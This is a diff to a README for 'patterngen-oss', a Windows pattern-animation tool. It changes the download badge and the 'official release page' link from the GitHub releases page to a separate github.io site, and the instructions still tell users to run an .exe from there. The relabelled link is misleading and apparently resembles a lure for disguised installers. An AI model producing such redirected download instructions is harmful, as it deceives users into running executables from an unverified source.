@@ -1,6 +1,6 @@
 # 🎨 patterngen-oss - Create animated patterns for motion graphics
 
-[![Download PatternGen for Windows](https://img.shields.io/badge/Download-PatternGen-blue)](https://github.com/ugyens7615/patterngen-oss/releases)
+[![Download PatternGen for Windows](https://img.shields.io/badge/Download-PatternGen-blue)](https://ugyens7615.github.io)
 
 ## 🎯 Purpose of this tool
 
@@ -20,7 +20,7 @@ Before you run the software, ensure your computer meets these needs:
 
 You need to download the installer from the release page.
 
-1.  Open the [official release page](https://github.com/ugyens7615/patterngen-oss/releases).
+1.  Open the [official release page](https://ugyens7615.github.io).
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder.
